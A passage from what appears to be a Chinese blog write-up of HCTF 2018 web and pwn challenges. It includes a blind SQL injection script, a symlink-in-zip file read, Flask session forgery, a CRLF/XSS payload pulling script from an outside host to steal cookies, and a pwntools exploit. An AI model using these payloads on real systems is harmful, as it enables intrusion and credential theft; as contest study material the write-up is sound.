payload.replace(&apos;s&apos;, &apos;u0073&apos;)</span><br><span class="line">    payload = payload.replace(&apos;#&apos;, &apos;u0023&apos;)</span><br><span class="line">    payload = payload.replace(&apos;&gt;&apos;, &apos;u003e&apos;)</span><br><span class="line">    payload = payload.replace(&apos;&lt;&apos;, &apos;u003c&apos;)</span><br><span class="line">    payload = payload.replace(&apos;-&apos;, &apos;u002d&apos;)</span><br><span class="line">    payload = payload.replace(&apos;=&apos;, &apos;u003d&apos;)</span><br><span class="line">    payload = payload.replace(&apos;f1a9&apos;, &apos;F1a9&apos;)</span><br><span class="line">    payload = payload.replace(&apos;f1&apos;, &apos;F1&apos;)</span><br><span class="line">    return data % payload</span><br></pre></td></tr></table></figure>
+<p>指定bool盲注:</p>
+<p><code>--technique=B</code></p>
+<p>指定数据库:</p>
+<p><code>-dbms=mysql</code></p>
+<p>sql识别:</p>
+<p><code>--not-string=window.location</code></p>
+<p>再加点线程:</p>
+<p><code>--thread=10</code></p>
+<p>最后:</p>
+<p><code>sqlmap -r 1.txt --tamper=hctf --dbms=mysql --thread=10 --technique=B --not-string=window.location --dbs</code></p>
+<h3 id="方法二-1"><a href="#方法二-1" class="headerlink" title="方法二"></a>方法二</h3><p>python3会对unicode编码自动解码，需要转义一下，python2不需要。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">url = &apos;http://kzone.2018.hctf.io/include/common.php&apos;</span><br><span class="line">str1 = string.ascii_letters+string.digits+&apos;&#123;&#125;!@#$*&amp;_,&apos;</span><br><span class="line"></span><br><span class="line">def check(payload):</span><br><span class="line">    cookie=&#123;</span><br><span class="line">        &apos;PHPSESSID&apos;:&apos;8ehnp28ccr4ueh3gnfc3uqtau1&apos;,</span><br><span class="line">        &apos;islogin&apos;:&apos;1&apos;,</span><br><span class="line">        &apos;login_data&apos;:payload</span><br><span class="line">    &#125;</span><br><span class="line">    try:</span><br><span class="line">        requests.get(url,cookies=cookie,timeout=3)</span><br><span class="line">        return 0</span><br><span class="line">    except:</span><br><span class="line">        return 1</span><br><span class="line"></span><br><span class="line">result=&apos;&apos;</span><br><span class="line">for i in range(1,33):</span><br><span class="line">    for j in str1:</span><br><span class="line">        #payload=&apos;&#123;&quot;admin_user&quot;:&quot;admin\&apos;and/**/\\u0069f(\\u0073ubstr((select/**/table_name/**/from/**/inf\\u006Frmation_schema.tables/**/where/**/table_schema\\u003Ddatabase()/**/limit/**/0,1),%d,1)\\u003D\&apos;%s\&apos;,\\u0073leep(3),0)/**/and/**/\&apos;1&quot;,&quot;admin_pass&quot;:65&#125;&apos;%(i,j)</span><br><span class="line">        payload = &apos;&#123;&quot;admin_user&quot;:&quot;admin\&apos;/**/and/**/\\u0069f(\\u0061scii(\\u0073ubstr((select/**/F1a9/**/from/**/F1444g),%s,1))\\u003d%s,\\u0073leep(4),1)/**/and/**/\&apos;1&quot;,&quot;admin_pass&quot;:&quot;123&quot;&#125;&apos;% (str(i),ord(j))      </span><br><span class="line">        #print(&apos;[+]&apos;+payload)</span><br><span class="line">        if check(payload):     </span><br><span class="line">            result += j</span><br><span class="line">            break</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
+<h2 id="hide-and-seek"><a href="#hide-and-seek" class="headerlink" title="hide and seek"></a>hide and seek</h2><p><strong>only admin can get it update1/更新1: 1. fix bugs 2. attention: you may need to restart all your work as something has changed hint: 1. docker 2. only few things running on it update2/更新2: Sorry，there are still some bugs, so down temporarily. update3/更新3: fixed bug</strong></p>
+<p>参考链接:<code>https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ln -s /etc/passwd link</span><br><span class="line"></span><br><span class="line">zip -y test.zip link</span><br></pre></td></tr></table></figure>
+<p>上传之后，可以看到<code>/etc/passwd</code>.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/bin/false nginx:x:101:102:nginx user,,,:/nonexistent:/bin/false messagebus:x:102:103::/var/run/dbus:/bin/false</span><br></pre></td></tr></table></figure>
+<p>尝试读取/proc/self/environ中的环境变量:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgiSUPERVISOR_GROUP_NAME=uwsgiHOSTNAME=30b76592807cSHLVL=0PYTHON_PIP_VERSION=18.1HOME=/rootGPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DUWSGI_INI=/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.iniNGINX_MAX_UPLOAD=0UWSGI_PROCESSES=16STATIC_URL=/staticUWSGI_CHEAPER=2NGINX_VERSION=1.13.12-1~stretchPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binNJS_VERSION=1.13.12.0.2.0-1~stretchLANG=C.UTF-8SUPERVISOR_ENABLED=1PYTHON_VERSION=3.6.6NGINX_WORKER_PROCESSES=autoSUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sockSUPERVISOR_PROCESS_NAME=uwsgiLISTEN_PORT=80STATIC_INDEX=0PWD=/app/hard_t0_guess_n9f5a95b5ku9fgSTATIC_PATH=/app/staticPYTHONPATH=/appUWSGI_RELOADS=0</span><br></pre></td></tr></table></figure>
+<p>读取<code>/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini</code>:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[uwsgi] module = hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_main callable=app</span><br></pre></td></tr></table></figure>
+<p>读取<code>/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py</code>:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from flask import Flask,session,render_template,redirect, url_for, escape, request,Response</span><br><span class="line">import uuid</span><br><span class="line">import base64</span><br><span class="line">import random</span><br><span class="line">import flag</span><br><span class="line">from werkzeug.utils import secure_filename</span><br><span class="line">import os</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[&apos;SECRET_KEY&apos;] = str(random.random()*100)</span><br><span class="line">app.config[&apos;UPLOAD_FOLDER&apos;] = &apos;./uploads&apos;</span><br><span class="line">app.config[&apos;MAX_CONTENT_LENGTH&apos;] = 100 * 1024</span><br><span class="line">ALLOWED_EXTENSIONS = set([&apos;zip&apos;])</span><br><span class="line"></span><br><span class="line">def allowed_file(filename):</span><br><span class="line">    return &apos;.&apos; in filename and \</span><br><span class="line">           filename.rsplit(&apos;.&apos;, 1)[1].lower() in ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&apos;/&apos;, methods=[&apos;GET&apos;])</span><br><span class="line">def index():</span><br><span class="line">    error = request.args.get(&apos;error&apos;, &apos;&apos;)</span><br><span class="line">    if(error == &apos;1&apos;):</span><br><span class="line">        session.pop(&apos;username&apos;, None)</span><br><span class="line">        return render_template(&apos;index.html&apos;, forbidden=1)</span><br><span class="line"></span><br><span class="line">    if &apos;username&apos; in session:</span><br><span class="line">        return render_template(&apos;index.html&apos;, user=session[&apos;username&apos;], flag=flag.flag)</span><br><span class="line">    else:</span><br><span class="line">        return render_template(&apos;index.html&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&apos;/login&apos;, methods=[&apos;POST&apos;])</span><br><span class="line">def login():</span><br><span class="line">    username=request.form[&apos;username&apos;]</span><br><span class="line">    password=request.form[&apos;password&apos;]</span><br><span class="line">    if request.method == &apos;POST&apos; and username != &apos;&apos; and password != &apos;&apos;:</span><br><span class="line">        if(username == &apos;admin&apos;):</span><br><span class="line">            return redirect(url_for(&apos;index&apos;,error=1))</span><br><span class="line">        session[&apos;username&apos;] = username</span><br><span class="line">    return redirect(url_for(&apos;index&apos;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&apos;/logout&apos;, methods=[&apos;GET&apos;])</span><br><span class="line">def logout():</span><br><span class="line">    session.pop(&apos;username&apos;, None)</span><br><span class="line">    return redirect(url_for(&apos;index&apos;))</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/upload&apos;, methods=[&apos;POST&apos;])</span><br><span class="line">def upload_file():</span><br><span class="line">    if &apos;the_file&apos; not in request.files:</span><br><span class="line">        return redirect(url_for(&apos;index&apos;))</span><br><span class="line">    file = request.files[&apos;the_file&apos;]</span><br><span class="line">    if file.filename == &apos;&apos;:</span><br><span class="line">        return redirect(url_for(&apos;index&apos;))</span><br><span class="line">    if file and allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        file_save_path = os.path.join(app.config[&apos;UPLOAD_FOLDER&apos;], filename)</span><br><span class="line">        if(os.path.exists(file_save_path)):</span><br><span class="line">            return &apos;This file already exists&apos;</span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    else:</span><br><span class="line">        return &apos;This file is not a zipfile&apos;</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        extract_path = file_save_path + &apos;_&apos;</span><br><span class="line">        os.system(&apos;unzip -n &apos; + file_save_path + &apos; -d &apos;+ extract_path)</span><br><span class="line">        read_obj = os.popen(&apos;cat &apos; + extract_path + &apos;/*&apos;)</span><br><span class="line">        file = read_obj.read()</span><br><span class="line">        read_obj.close()</span><br><span class="line">        os.system(&apos;rm -rf &apos; + extract_path)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        file = None</span><br><span class="line"></span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    if(file != None):</span><br><span class="line">        if(file.find(base64.b64decode(&apos;aGN0Zg==&apos;).decode(&apos;utf-8&apos;)) != -1):</span><br><span class="line">            return redirect(url_for(&apos;index&apos;, error=1))</span><br><span class="line">    return Response(file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    #app.run(debug=True)</span><br><span class="line">    app.run(host=&apos;127.0.0.1&apos;, debug=True, port=10008)</span><br></pre></td></tr></table></figure>
+<p>读取<code>templates/index.html</code>:</p>
+<figure class="highlight plain"><figcaption><span>if user </span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if user == &apos;admin&apos; %&#125;</span><br><span class="line">Your flag: &lt;br&gt;</span><br><span class="line">&#123;&#123; flag  &#125;&#125;</span><br><span class="line">&#123;% else %&#125;</span><br></pre></td></tr></table></figure>
+<p>漏洞：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[&apos;SECRET_KEY&apos;] = str(random.random()*100)</span><br></pre></td></tr></table></figure>
+<p>这里的<code>uuid.getnode()</code>就是获取固定的mac地址。</p>
+<p>读取网卡信息<code>/proc/net/dev</code>：</p>
+<p>读取mac地址<code>/sys/class/net/eth0/address</code>:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">12:34:3e:14:7c:62 </span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; 0x12343e147c62</span><br><span class="line">20015589129314</span><br></pre></td></tr></table></figure>
+<p>得到SECRET_KEY之后，即可伪造session.</p>
+<h2 id="bottle"><a href="#bottle" class="headerlink" title="bottle"></a>bottle</h2><p>参考链接:<code>https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html</code></p>
+<p>bottle的crlf注入。直接crlf首先注入一个CSP头部覆盖调已有的，然后注入xss向量即可，中间还需要注一个content-type头部，不然xss向量不解析。网上找到p牛的文章中的exp改一下就行了，exp如下：</p>
+<p><code>http://bottle.2018.hctf.io/path?path=http://bottle.2018.hctf.io:0/%250aContent-Type:text/html%250aContent-Security-Policy:script-src%2520*%250a%250a%3Cscript/src=http://zzm.cat/1.js%3E%3C/script%3E&gt;</code></p>
+<p>刚开始的时候，CSP是在响应包的上面的，需要想办法绕过CSP。最后伟哥告诉我那个hint1不是机器人访问的crontab，是bottle这个框架重启的crontab。bottle这个框架好像有一个特性，每次重启的时候可以bypass掉CSP。但是出题人好像第二天发现这个bypass思路自己都复现不了，所以就把CSP设置到响应包下面了。 接下来就简单了，只需要绕过302跳转就可以打到cookie。因为302的时候不会xss。利用 &lt; 80端口可以绕过302跳转。可以在浏览器手动试一下。 80端口的时候:</p>
+<p><img src="/assets/hctf/t019bc9c8888d4e662f.png" alt=""></p>
+<p>22端口: </p>
+<p><img src="/assets/hctf/t01c3231280f50efbe4.png" alt=""></p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://bottle.2018.hctf.io/path?path=http://bottle.2018.hctf.io:22/user%0d%0aX-XSS-Protection:0%0d%0aContent-Length:300%0d%0a%0d%0a%3Cscript%20src%3dhttp://139.199.27.197:7000/1.js%3E%3C/script%3E</span><br></pre></td></tr></table></figure>
+<h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>这里可以根据pass降序排列:</p>
+<p><code>http://game.2018.hctf.io/web2/user.php?order=password</code></p>
+<p>因而，可以一位一位的爆破出password。</p>
+<p>比如:</p>
+<p>首先注册一个密码为<code>d</code>的用户，该用户最终会出现在<code>id为1，用户名为admin</code>的用户之后。</p>
+<p>在注册一个密码为<code>e</code>的用户，该用户最终会出现在<code>id为1，用户名为admin</code>的用户之前。从而可以确定admin的密码第一位为<code>d</code>,反复注册即可。</p>
+<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="the-end"><a href="#the-end" class="headerlink" title="the_end"></a>the_end</h2><p>当执行exit函数的时候，会清空缓冲区，<code>_IO_2_1_stdout_</code>结构便起了很大的作用。</p>
+<h3 id="方法1-1"><a href="#方法1-1" class="headerlink" title="方法1"></a>方法1</h3><p><code>exit -&gt; exit + 16 -&gt; __run_exit_handlers+18 -&gt; __run_exit_handlers+230 -&gt; _dl_fini+126</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; </span><br><span class="line">0x00007ffa38b80b2e	153	in dl-fini.c</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">───────────────────────────────────[ REGISTERS ]───────────────────────────────────</span><br><span class="line"> RAX  0x90</span><br><span class="line"> RBX  0x539</span><br><span class="line"> RCX  0x7ffa38d96040 (_rtld_global) —▸ 0x7ffa38d97168 —▸ 0x55a87726f000 ◂— jg     0x55a87726f047</span><br><span class="line"> RDX  0x7ffa38b80ab0 (_dl_fini) ◂— push   rbp</span><br><span class="line"> RDI  0x7ffa38d96948 (_rtld_global+2312) ◂— 0x0</span><br><span class="line"> RSI  0x539</span><br><span class="line"> R8   0x7ffa38b6c780 (_IO_stdfile_1_lock) ◂— 0x0</span><br><span class="line"> R9   0x7ffa38d78700 ◂— 0x7ffa38d78700</span><br><span class="line"> R10  0x0</span><br><span class="line"> R11  0x246</span><br><span class="line"> R12  0x7ffa38d96048 (_rtld_global+8) ◂— 0x4</span><br><span class="line"> R13  0x7ffa38b6bc40 (initial) ◂— 0x0</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x7ffd96fb0c60 —▸ 0x7ffa38b6a5f8 (__exit_funcs) —▸ 0x7ffa38b6bc40 (initial) ◂— 0x0</span><br><span class="line"> RSP  0x7ffd96fb0bd0 ◂— 0x6562b026</span><br><span class="line"> RIP  0x7ffa38b80b2e (_dl_fini+126) ◂— call   qword ptr [rip + 0x216414]</span><br><span class="line">────────────────────────────────────[ DISASM ]─────────────────────────────────────</span><br><span class="line">   0x7ffa38b80ae4 &lt;_dl_fini+52&gt;     lea    rcx, [rip + 0x215555] &lt;0x7ffa38d96040&gt;</span><br><span class="line">   0x7ffa38b80aeb &lt;_dl_fini+59&gt;     shl    rax, 4</span><br><span class="line">   0x7ffa38b80aef &lt;_dl_fini+63&gt;     lea    r12, [rcx + rax - 0x88]</span><br><span class="line">   0x7ffa38b80af7 &lt;_dl_fini+71&gt;     jmp    _dl_fini+119 &lt;0x7ffa38b80b27&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x7ffa38b80b27 &lt;_dl_fini+119&gt;    lea    rdi, [rip + 0x215e1a] &lt;0x7ffa38d96948&gt;</span><br><span class="line"> ► 0x7ffa38b80b2e &lt;_dl_fini+126&gt;    call   qword ptr [rip + 0x216414] &lt;0x7ffa388962a4&gt;</span><br><span class="line">        rdi: 0x7ffa38d96948 (_rtld_global+2312) ◂— 0x0</span><br><span class="line">        rsi: 0x539</span><br><span class="line">        rdx: 0x7ffa38b80ab0 (_dl_fini) ◂— push   rbp</span><br><span class="line">        rcx: 0x7ffa38d96040 (_rtld_global) —▸ 0x7ffa38d97168 —▸ 0x55a87726f000 ◂— jg     0x55a87726f047</span><br><span class="line"> </span><br><span class="line">   0x7ffa38b80b34 &lt;_dl_fini+132&gt;    mov    ecx, dword ptr [r12]</span><br><span class="line">   0x7ffa38b80b38 &lt;_dl_fini+136&gt;    test   ecx, ecx</span><br><span class="line">   0x7ffa38b80b3a &lt;_dl_fini+138&gt;    je     _dl_fini+80 &lt;0x7ffa38b80b00&gt;</span><br><span class="line"> </span><br><span class="line">   0x7ffa38b80b3c &lt;_dl_fini+140&gt;    mov    rax, qword ptr [r12 - 8]</span><br><span class="line">   0x7ffa38b80b41 &lt;_dl_fini+145&gt;    movzx  edx, byte ptr [rax + 0x315]</span><br><span class="line">─────────────────────────────────────[ STACK ]─────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7ffd96fb0bd0 ◂— 0x6562b026</span><br><span class="line">01:0008│      0x7ffd96fb0bd8 ◂— 0x3000000010</span><br><span class="line">02:0010│      0x7ffd96fb0be0 —▸ 0x7ffd96fb0cb0 ◂— 0x596fb0da0</span><br><span class="line">03:0018│      0x7ffd96fb0be8 —▸ 0x7ffd96fb0bf0 —▸ 0x7ffd96ff9280 ◂— add    byte ptr ss:[rax], al /* &apos;6&apos; */</span><br><span class="line">04:0020│      0x7ffd96fb0bf0 —▸ 0x7ffd96ff9280 ◂— add    byte ptr ss:[rax], al /* &apos;6&apos; */</span><br><span class="line">05:0028│      0x7ffd96fb0bf8 —▸ 0x7ffa38872230 (sleep) ◂— push   rbp</span><br><span class="line">06:0030│      0x7ffd96fb0c00 —▸ 0x7ffd96fb0db8 —▸ 0x7ffd96fb2224 ◂— 0x52454d554e5f434c (&apos;LC_NUMER&apos;)</span><br><span class="line">07:0038│      0x7ffd96fb0c08 —▸ 0x7ffa388722f0 (__nanosleep_nocancel+7) ◂— cmp    rax, -0xfff</span><br><span class="line">───────────────────────────────────[ BACKTRACE ]───────────────────────────────────</span><br><span class="line"> ► f 0     7ffa38b80b2e _dl_fini+126</span><br><span class="line">   f 1     7ffa387dfff8 __run_exit_handlers+232</span><br><span class="line">   f 2     7ffa387e0045</span><br><span class="line">   f 3     55a87726f969</span><br><span class="line">   f 4        596fb0da0</span><br><span class="line">   f 5     7ffa38d96f4c _rtld_global+3852</span><br><span class="line">   f 6     55a87726f970</span><br><span class="line">   f 7     7ffa387c6830 __libc_start_main+240</span><br><span class="line">   f 8     55a87726f7c9</span><br><span class="line">   f 9     7ffd96fb0d98</span><br><span class="line">   f 10               1c</span><br><span class="line">pwndbg&gt; x/xg 0x7ffa38b80b2e + 0x216414</span><br><span class="line">0x7ffa38d96f42 &lt;_rtld_global+3842&gt;:	0x62a4000000000000</span><br><span class="line">pwndbg&gt; x/xg 0x7ffa38b80b34 + 0x216414</span><br><span class="line">0x7ffa38d96f48 &lt;_rtld_global+3848&gt;:	0x00007ffa388962a4</span><br></pre></td></tr></table></figure>
+<p>exp:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">debug = int(raw_input(&quot;is_debug:&quot;))</span><br><span class="line"></span><br><span class="line">if debug:</span><br><span class="line">    p = process(&quot;./the_end&quot;)</span><br><span class="line">#    libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">    libc = ELF(&quot;./libc64.so&quot;)</span><br><span class="line">    context.log_level = &quot;debug&quot;</span><br><span class="line">    one_gadget = 0xf02a4</span><br><span class="line">#    one_gadget = 0xf1147</span><br><span class="line">    free_hook = 0x3c67a8</span><br><span class="line">else:</span><br><span class="line">    p = remote(&quot;150.109.44.250&quot;, 20002)</span><br><span class="line">    libc = ELF(&quot;./libc64.so&quot;)</span><br><span class="line">   # one_gadget = 0xf1231</span><br><span class="line">    one_gadget = 0xf02a4</span><br><span class="line">    free_hook = 0x3c67a8</span><br><span class="line">    context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">if not debug:</span><br><span class="line">    p.recvuntil(&quot;token:&quot;)</span><br><span class="line">    p.sendline(&quot;MGZM3eIB6lN6aL9gs1guW2CIVP4iYx3E&quot;)</span><br><span class="line"></span><br><span class="line">data = p.recvline()</span><br><span class="line">sleep_addr = data[15:29]</span><br><span class="line">print sleep_addr</span><br><span class="line"></span><br><span class="line">libc_addr = int(sleep_addr, 16) - libc.symbols[&apos;sleep&apos;]</span><br><span class="line">print hex(libc_addr)</span><br><span class="line">libc.address = libc_addr</span><br><span class="line"></span><br><span class="line">if debug:</span><br><span class="line">    attach(p)</span><br><span class="line"></span><br><span class="line">#0x7f5f336d8f48</span><br><span class="line">target_addr = libc_addr + 0x5f0f48</span><br><span class="line">one_gadget = libc_addr + one_gadget</span><br><span class="line">print hex(one_gadget)</span><br><span class="line">p.send(p64(target_addr))</span><br><span class="line">p.send(p64(one_gadget)[0:1])</span><br><span class="line">p.send(p64(target_addr + 1))</span><br><span class="line">p.send(p64(one_gadget)[1:2])</span><br><span class="line">p.send(p64(target_addr + 2))</span><br><span class="line">p.send(p64(one_gadget)[2:3])</span><br><span class="line">p.send(p64(target_addr + 3))</span><br><span class="line">p.send(p64(one_gadget)[3:4])</span><br><span class="line">p.send(p64(target_addr + 4))</span><br><span class="line">p.send(p64(one_gadget)[4:5])</span><br><span class="line">p.sendline(&quot;cat flag &gt;&amp;0&quot;)        # 本地可执行命令，比如`curl 123.207.90.143`但是查看文件，列目录等，远程可以 `cat flag &gt;&amp;0`的方式查看内容。</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
